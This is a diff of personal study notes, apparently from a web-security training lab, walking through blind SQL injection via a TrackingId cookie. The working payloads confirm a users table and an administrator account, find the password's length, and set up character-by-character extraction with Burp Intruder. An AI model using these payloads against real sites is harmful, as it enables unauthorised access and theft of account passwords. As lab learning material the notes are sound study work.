@@ -33,7 +33,7 @@ Cookie: TrackingId=aaaaaaaaaaaaaaaa' and '1'='1; session=aaaaaaaaaaaaaaaaaaaaaaa
 Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   Provides welcome back, verifies table
 Cookie: TrackingId=aaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM notusers LIMIT 1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Provides no welcome back, nerifies no table
 TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator')='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, admin is there. 
-TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, passowrd is > 1.
+TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, passowrd is > 1. May use intruder to guess
 TrackingId=aaaaaaaaaaaaaaaaaaaaa' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a; session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  Welcome back, passowrd is = 20
 So, we know length and we know how to test if conditions are true, we now need to test is each charachter is true. Only Lower alpha to reserve time. 
 Note:
@@ -43,8 +43,8 @@ and work through all permutations of offsets and character values.
 Beginner: This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
 Put payload into intuder, "Clear §" button. 
 "Clear §" button. 
-Cookie: TrackingId=cf7tRTrsw0toB1tR' AND (SELECT (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;
+Cookie: TrackingId=aaaaaaaaaaaa' AND (SELECT (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;
   High light a and select add §    You a then becomes §a§
-  payloads, simple list add a-z 0-9
+  payloads, Type Simple list > Add from list!!! 
   options, grep match Welcome back
   
